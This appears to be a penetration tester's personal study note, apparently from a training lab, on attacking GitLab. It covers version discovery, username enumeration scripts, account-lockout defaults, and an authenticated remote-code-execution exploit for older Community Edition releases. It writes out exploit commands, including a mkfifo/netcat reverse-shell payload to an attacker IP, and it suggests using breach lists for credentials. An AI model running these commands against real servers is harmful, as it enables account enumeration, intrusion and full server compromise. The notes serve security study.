---
aliases:
tags:
source:
  - https://about.gitlab.com/
desc: GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality
---


- look for ssh private keys, users, passwords, data
- use breach lists for potential credentials
	- two factor is disabled by default
- further reading
	- https://tillsongalloway.com/finding-sensitive-information-on-github/index.html



# discovery

- only way to get the version number is browsing the `/help` page after logging in
	- can you try and create an account
	- if you cant create an account, try this https://www.exploit-db.com/exploits/49821


# enumeration

- without knowing the version number or having a log in, there is not much we can target
- if we have a log in
	- `/explore` to see the projects
- check groups, snippets, help
  ![[assets/attachments/kb/tools/gitlab/image.png]]
- if the instance is self managed, you could try username or email address enumeration
  ![[assets/attachments/kb/tools/gitlab/image-1.png]]


# attack

- username enumeration
	- https://www.exploit-db.com/exploits/49821
		- `searchsploit -m ruby/webapps/49821.sh`
		- `./49821.sh -u http://gitlab.inlanefreight.local:8081 --userlist /usr/share/seclists/Usernames/cirt-default-usernames.txt`
	- python3 https://github.com/dpgg101/GitLabUserEnum
		- `python3 ./gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081 --wordlist /usr/share/seclists/Usernames/cirt-default-usernames.txt -v`
	- In versions below 16.6, GitLab's defaults are set to 10 failed login attempts, resulting in an automatic unlock after 10 minutes
		- versions post this can be configured 
		- The number of authentication attempts before locking an account and the unlock period can be set using the `max_login_attempts` and `failed_login_attempts_unlock_period_in_minutes` settings
- remote code execution
	- Remote code execution vulnerabilities are typically considered the "cream of the crop" as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privileges first) and can serve as a foothold into the network for us to launch further attacks against other systems and potentially result in full network compromise
	- GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution
		- https://hackerone.com/reports/1154542
		- exploit https://www.exploit-db.com/exploits/49951
			- `nc -nlvp 8443`
			- `sudo apt install djvulibre-bin`
			- `python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u auser -p Password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.50 8443 >/tmp/f '`
		- requires valid username and password but if self hosted try registering
	- 